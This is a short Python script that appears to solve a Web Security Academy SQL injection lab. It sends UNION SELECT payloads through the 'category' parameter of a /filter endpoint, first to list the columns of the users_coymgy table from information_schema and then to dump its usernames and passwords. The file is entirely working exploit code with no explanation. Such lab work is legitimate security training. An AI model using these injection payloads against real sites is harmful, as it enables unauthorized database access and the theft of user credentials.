import requests
from bs4 import BeautifulSoup
import re
site = 'acde1f901f0c34f7802425ff006f0003.web-security-academy.net'
s = requests.Session()

url = "https://acde1f901f0c34f7802425ff006f0003.web-security-academy.net/filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_coymgy%27--"
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
print(resp.text)
username_col = soup.find('table').find('th',text=re.compile('^username')).text
password_col = soup.find('table').find('th',text=re.compile('^password')).text
print(f"Found username column of {username_col}")
print(f"Found password column of {password_col}")
user_table = 'users_coymgy'

url = f"https://acde1f901f0c34f7802425ff006f0003.web-security-academy.net/filter?category=' UNION SELECT {username_col},{password_col} from {user_table} -- "
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
print(resp.text)